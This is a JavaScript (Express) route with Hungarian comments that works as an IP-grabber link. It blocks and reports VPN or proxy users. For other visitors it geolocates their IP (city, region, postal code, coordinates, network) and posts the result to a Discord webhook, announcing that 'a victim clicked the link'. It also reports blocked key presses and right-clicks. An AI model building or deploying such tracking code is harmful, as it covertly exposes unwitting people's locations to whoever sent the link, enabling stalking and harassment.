// /send-ip útvonal (ÁTÍRVA - ez cseréld le!)
app.get('/send-ip', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const reason = req.query.reason || "Oldal betöltése";

    // Ha az IP engedélyezett, akkor nem ellenőrizzük VPN/Proxy használatot
    if (allowedIps.includes(userIp)) {
        console.log(`Engedélyezett IP: ${userIp}, VPN/Proxy ellenőrzés kihagyva.`);
        return res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
    }

    try {
        // ProxyCheck API használata a VPN/Proxy ellenőrzéshez
        const proxyCheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxyCheckApiKey}&vpn=1&proxy=1`);
        const proxyCheckData = proxyCheckResponse.data;

        // Ellenőrizzük, hogy VPN vagy Proxy használat van-e
        if (proxyCheckData[userIp].vpn === "yes" || proxyCheckData[userIp].proxy === "yes") {
            // Ha VPN vagy Proxy van, nem küldjük el az IP-t Discordra és az alt webhook-ra küldünk értesítést
            console.log(`VPN vagy Proxy használat észlelve: IP: ${userIp}`);

            // Üzenet küldése az alt webhook-ra
            const altMessage = {
                username: "VPN/Proxy Észlelő Rendszer",
                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                content: `Figyelem! VPN vagy Proxy használatot észleltünk az IP címen: ${userIp}`,
                embeds: [{
                    title: "VPN/Proxy használat észlelve!",
                    description: `**IP-cím >>** ${userIp}`,
                    color: 0xFF0000  // Piros szín
                }]
            };

            // Webhook küldés a másik webhook URL-re
            await axios.post(altWebhookUrl, altMessage);

            // Visszaküldjük a hibaüzenetet
            return res.status(403).send("Hozzáférés tilos: VPN vagy Proxy használata nem engedélyezett.");
        }

        // Ha nincs VPN vagy Proxy, akkor folytatódik az IP információk lekérése
        const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
        const geoData = geoResponse.data;

        const [latitude, longitude] = (geoData.loc || '0,0').split(',');

        // Összeállítjuk az üzenetet
        const message = {
            username: reason !== "Oldal betöltése" ? "Tiltott művelet!" : "Helyszíni Naplózó <3",
            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
            embeds: [{
                title: reason !== "Oldal betöltése"
                    ? "Tiltott billentyű vagy jobb klikk!"
                    : "Egy áldozat rákattintott a linkre!",
                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}\n**Ok:** ${reason}`,
                color: reason !== "Oldal betöltése" ? 0xFF0000 : 0x800080
            }]
        };

        // KÜLDÉS: Ha tiltott dolog történt ALT webhook, amúgy sima webhook!
        if (reason !== "Oldal betöltése") {
            await axios.post(altWebhookUrl, message);
        } else {
            await axios.post(webhookUrl, message);
        }

        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
    } catch (error) {
        console.error('Hiba:', error.message);
        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
    }
});
